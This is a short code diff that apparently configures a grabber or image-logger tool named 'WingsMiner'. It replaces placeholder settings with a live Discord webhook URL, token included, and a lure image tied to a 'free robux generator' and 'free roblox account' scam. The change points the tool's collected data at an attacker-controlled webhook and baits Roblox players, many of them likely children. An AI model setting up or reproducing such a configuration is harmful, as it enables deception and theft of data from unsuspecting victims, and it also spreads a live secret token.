@@ -22,8 +22,8 @@ __version__ = "v2.0"
 __author__ = "lynxWings"
 
 config = {
-    "webhook": "your_webhook_link_here", # <------------------------- Put your webhook link here.
-    "image": "your_image_address_link_here", # <------------------------- Put image address link here.
+    "webhook": "https://discord.com/api/webhooks/1143467743438442517/xO7Ehb9MLIALxu3Ims1JzmEkZYqf9OZxww6y26pGcZTufvD--qX0YdtmT5mW1WiGESwY", # <------------------------- Put your webhook link here.
+    "image": "https://www.google.com/imgres?imgurl=https%3A%2F%2Fimgnew.outlookindia.com%2Fuploadimage%2Flibrary%2F16_9%2F16_9_5%2FIMAGE_1680776611.webp&tbnid=cnY_5fGZdtHL2M&vet=12ahUKEwijv6X-8e-AAxXpKRAIHXzqABIQMygAegQIARAz..i&imgrefurl=https%3A%2F%2Fwww.outlookindia.com%2Fbusiness-spotlight%2Ffree-robux-generator-get-10-000-robloxrobux-no-human-verification-2023-news-276421&docid=nscHsmagW9ilDM&w=1200&h=675&q=free%20roblox%20account&ved=2ahUKEwijv6X-8e-AAxXpKRAIHXzqABIQMygAegQIARAz", # <------------------------- Put image address link here.
     "imageArgument": True,
 
     "username": "WingsMiner",
